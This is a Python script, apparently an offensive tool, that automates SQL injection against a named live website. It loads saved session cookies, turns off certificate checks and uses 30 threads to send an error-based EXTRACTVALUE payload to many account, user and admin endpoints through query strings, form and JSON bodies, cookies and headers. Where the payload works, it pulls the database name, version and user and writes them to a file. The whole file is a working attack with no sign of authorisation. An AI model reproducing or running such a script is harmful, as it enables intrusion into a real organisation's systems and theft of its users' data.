#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

class UltimateDeepSQLi:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.working = []
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_get_sqli(self, endpoint, param, payload):
        """测试GET注入"""
        url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
        try:
            start = time.time()
            r = self.session.get(url, timeout=15)
            elapsed = time.time() - start
            
            if 'TEST' in r.text or 'XPATH' in r.text.upper() or elapsed > 4:
                return {'method': 'GET', 'endpoint': endpoint, 'param': param, 'payload': payload, 'response': r.text[:1000], 'elapsed': elapsed}
        except:
            pass
        return None
    
    def test_post_sqli(self, endpoint, param, payload):
        """测试POST注入"""
        try:
            data = {param: payload}
            start = time.time()
            r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=15)
            elapsed = time.time() - start
            
            if 'TEST' in r.text or 'XPATH' in r.text.upper() or elapsed > 4:
                return {'method': 'POST', 'endpoint': endpoint, 'param': param, 'payload': payload, 'response': r.text[:1000], 'elapsed': elapsed}
        except:
            pass
        return None
    
    def test_json_sqli(self, endpoint, param, payload):
        """测试JSON注入"""
        try:
            data = {param: payload}
            start = time.time()
            r = self.session.post(f"{self.base_url}{endpoint}", json=data, timeout=15)
            elapsed = time.time() - start
            
            if 'TEST' in r.text or 'XPATH' in r.text.upper() or elapsed > 4:
                return {'method': 'JSON', 'endpoint': endpoint, 'param': param, 'payload': payload, 'response': r.text[:1000], 'elapsed': elapsed}
        except:
            pass
        return None
    
    def test_cookie_sqli(self, endpoint, param, payload):
        """测试Cookie注入"""
        try:
            cookies = {param: payload}
            start = time.time()
            r = self.session.get(f"{self.base_url}{endpoint}", cookies=cookies, timeout=15)
            elapsed = time.time() - start
            
            if 'TEST' in r.text or 'XPATH' in r.text.upper() or elapsed > 4:
                return {'method': 'COOKIE', 'endpoint': endpoint, 'param': param, 'payload': payload, 'response': r.text[:1000], 'elapsed': elapsed}
        except:
            pass
        return None
    
    def test_header_sqli(self, endpoint, param, payload):
        """测试Header注入"""
        try:
            headers = {param: payload}
            start = time.time()
            r = self.session.get(f"{self.base_url}{endpoint}", headers=headers, timeout=15)
            elapsed = time.time() - start
            
            if 'TEST' in r.text or 'XPATH' in r.text.upper() or elapsed > 4:
                return {'method': 'HEADER', 'endpoint': endpoint, 'param': param, 'payload': payload, 'response': r.text[:1000], 'elapsed': elapsed}
        except:
            pass
        return None
    
    def extract_from_result(self, result):
        """从结果中提取数据库"""
        if not result:
            return None
        
        endpoint = result['endpoint']
        param = result['param']
        method = result['method']
        
        queries = [
            ('SELECT database()', '数据库名'),
            ('SELECT version()', '版本'),
            ('SELECT user()', '用户'),
        ]
        
        for query, label in queries:
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
            
            try:
                if method == 'GET':
                    url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                    r = self.session.get(url, timeout=10)
                elif method == 'POST':
                    data = {param: payload}
                    r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=10)
                elif method == 'JSON':
                    data = {param: payload}
                    r = self.session.post(f"{self.base_url}{endpoint}", json=data, timeout=10)
                else:
                    continue
                
                match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                if match:
                    value = match.group(1)
                    print(f"        [+] {label}: {value}")
                    self.db_info[label] = value
                    return value
            except:
                pass
        
        return None
    
    def comprehensive_scan(self):
        """全面扫描"""
        print("[*] 全面扫描所有端点和方法...")
        
        endpoints = [
            '/Account/GetUserInfo',
            '/Account/JLogin',
            '/Account/Logout',
            '/Account/RegisterView',
            '/Account/Register',
            '/Handle/SearchListCustomer',
            '/Handle/SearchListProvince',
            '/Handle/SearchListWardByDistrictID',
            '/Handle/SearchListDistrictByProvinceID',
            '/Handle/SearchListWareHouse',
            '/Handle/SearchListProductVariantByWareHouseID',
            '/Handle/SearchListFunctionalByGroupPermissionID',
            '/Handle/TransportPostageCharged',
            '/Handle/SearchPWDByVMapCode',
            '/Handle/SearchPWDByVNPMapsAutocomplete',
            '/Handle/SearchPWDByVNPMapsSearch',
            '/Handle/SearchPWDByEMSVMapsSearch',
            '/Handle/SearchPWDByEMSMapsSearch',
            '/Handle/VNPMapsAutocomplete',
            '/api/user',
            '/api/users',
            '/Admin/GetUser',
            '/Admin/GetUserInfo',
        ]
        
        params = ['id', 'ID', 'Id', 'user_id', 'userID', 'userId', 'customer_id', 'customerID',
                  'q', 'query', 'search', 'keyword', 'name', 'email', 'mobile', 'phone',
                  'MobileNumber', 'Email', 'Password', 'Type', 'DistrictID', 'ProvinceID',
                  'WareHouseID', 'GroupPermissionID', 'username', 'user', 'uid']
        
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = []
            
            for endpoint in endpoints:
                for param in params:
                    # GET
                    futures.append(executor.submit(self.test_get_sqli, endpoint, param, payload))
                    # POST
                    futures.append(executor.submit(self.test_post_sqli, endpoint, param, payload))
                    # JSON
                    futures.append(executor.submit(self.test_json_sqli, endpoint, param, payload))
            
            # Cookie注入测试
            for endpoint in ['/Account/GetUserInfo', '/Handle/SearchListProvince']:
                for param in ['id', 'user_id']:
                    futures.append(executor.submit(self.test_cookie_sqli, endpoint, param, payload))
            
            # Header注入测试
            for endpoint in ['/Account/GetUserInfo']:
                for param in ['X-Forwarded-For', 'X-Real-IP', 'User-Agent']:
                    futures.append(executor.submit(self.test_header_sqli, endpoint, param, payload))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    print(f"    [!] {result['method']} {result['endpoint']} [{result['param']}]")
                    self.working.append(result)
                    self.extract_from_result(result)
    
    def run_all(self):
        """执行所有测试"""
        print("="*60)
        print("终极全面SQL注入扫描")
        print("="*60)
        
        self.comprehensive_scan()
        
        # 保存结果
        with open('ultimate_deep_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'working': self.working,
                'db_info': self.db_info
            }, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("最终结果")
        print("="*60)
        print(f"有效注入点: {len(self.working)}")
        print(f"数据库信息: {len(self.db_info)}")
        for k, v in self.db_info.items():
            print(f"  {k}: {v}")

if __name__ == "__main__":
    scanner = UltimateDeepSQLi()
    scanner.run_all()